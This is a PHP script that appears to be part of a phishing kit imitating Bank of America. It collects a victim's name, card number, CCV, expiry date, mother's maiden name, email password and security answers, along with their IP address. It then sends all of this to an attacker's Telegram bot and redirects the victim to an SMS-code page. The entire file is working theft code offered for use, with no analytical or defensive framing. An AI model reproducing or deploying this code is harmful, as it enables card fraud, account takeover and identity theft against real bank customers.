<?php
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$message .= "=====boa details ====="."\n";
$message .= "full name: ".$_POST['fullname']."\n";
$message .= "card number: ".$_POST['cardnumber']."\n";
$message .= "ccv: ".$_POST['ccv']."\n";
$message .= "expira data  Month: ".$_POST['expm']."\n";
$message .= "expira data Year: ".$_POST['expy']."\n";
$message .= "Mother Name: ".$_POST['mmn']."\n";
$message .= "email: ".$_POST['mail']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "question1: ".$_POST['question1']."\n";
$message .= "answer1: ".$_POST['answer1']."\n";
$message .= "question1: ".$_POST['question2']."\n";
$message .= "answer1: ".$_POST['answer2']."\n";
$message .= "question1: ".$_POST['question3']."\n";
$message .= "answer1: ".$_POST['answer3']."\n";
$message .= "question1: ".$_POST['question4']."\n";
$message .= "answer1: ".$_POST['answer4']."\n";
$message .= "question5: ".$_POST['question5']."\n";
$message .= "answer5: ".$_POST['answer5']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-----Created by metri-----"."\n";
$website = "https://api.telegram.org/" . $token_telegram;
$params=[
    'chat_id'=>$chat_id,
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);



include './txt.php';
           header("Location: sms.php?carta=" . $_POST['cardnumber']);



?> 